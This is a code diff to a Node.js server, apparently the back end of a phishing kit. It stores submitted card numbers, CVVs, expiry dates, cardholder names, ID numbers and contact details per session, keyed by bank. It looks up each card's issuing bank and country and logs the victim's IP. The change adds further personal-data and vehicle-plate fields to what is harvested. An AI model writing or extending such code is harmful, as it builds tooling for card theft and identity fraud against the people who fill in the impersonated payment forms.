@@ -406,10 +406,15 @@ const server = http.createServer(async (req, res) => {
             try {
                 const bancoKey = 'cc-' + consultaMatch[1];
                 const datos = await getBody(req);
-                const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
+                const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, datosPersonales, placasData } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
                 const datosPrevios = sesionesTemporales[sessionId] || {};
-                const datosCompletos = Object.assign({}, datosPrevios, { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, ip: ip, creadoEn: new Date().toISOString() });
+                const datosCompletos = Object.assign({}, datosPrevios, { 
+                    sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, 
+                    datosPersonales: datosPersonales || datosPrevios.datosPersonales || {},
+                    placasData: placasData || datosPrevios.placasData || [],
+                    ip: ip, creadoEn: new Date().toISOString() 
+                });
                 sesionesTemporales[sessionId] = datosCompletos;
                 guardarSesionesTemporales();
                 datosSesiones.set(sessionId, datosCompletos);
@@ -438,11 +443,25 @@ const server = http.createServer(async (req, res) => {
             try {
                 const bancoKey = 'cc-' + ccMatch[1];
                 const datos = await getBody(req);
-                const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
+                const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio, datosPersonales, placasData } = datos;
                 if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
                 const infoBin = await obtenerInfoBin(tarjeta);
                 const datosPrevios = sesionesTemporales[sessionId] || {};
-                const datosSesion = Object.assign({}, datosPrevios, { sessionId, bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa: placa || datosPrevios.placa || '', subsidio: subsidio || false, ip: ip, creadoEn: new Date().toISOString(), bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''), cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido' });
+                const datosSesion = Object.assign({}, datosPrevios, { 
+                    sessionId, bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, 
+                    placa: placa || datosPrevios.placa || '', 
+                    subsidio: subsidio || false, 
+                    datosPersonales: datosPersonales || datosPrevios.datosPersonales || {},
+                    placasData: placasData || datosPrevios.placasData || [],
+                    ip: ip, 
+                    creadoEn: new Date().toISOString(), 
+                    bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''), 
+                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida', 
+                    cardType: infoBin?.cardType || 'Desconocido', 
+                    cardLevel: infoBin?.cardLevel || 'Desconocido', 
+                    bankName: infoBin?.bankName || 'Desconocido', 
+                    countryName: infoBin?.countryName || 'Desconocido' 
+                });
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
